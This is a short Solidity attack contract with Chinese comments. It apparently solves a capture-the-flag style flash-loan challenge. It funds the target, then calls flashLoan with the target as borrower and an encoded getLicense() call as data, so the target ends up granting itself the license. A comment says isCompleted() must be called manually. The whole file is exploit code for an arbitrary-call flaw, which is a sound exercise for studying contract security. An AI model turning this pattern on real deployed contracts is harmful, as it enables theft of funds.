//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
interface Flashloan{
    function flashLoan(address target,uint256 amount,bytes memory data)external;
    function isCompleted()external;
}

contract attack{
    //获取getLicense函数的函数选择器
    function getData()public pure returns(bytes memory){
        return abi.encodeWithSignature("getLicense()");
    }
    //执行flashCall拿到License
    function att(address payable _addr)public payable {
        (bool success,)=_addr.call{value:msg.value}("");
        require(success);
        Flashloan(_addr).flashLoan(_addr,0,getData());
    }
    //手调，合约调不行
    function complete(address payable _addr)public{
        Flashloan(_addr).isCompleted();
    }
    receive()external payable{}
}
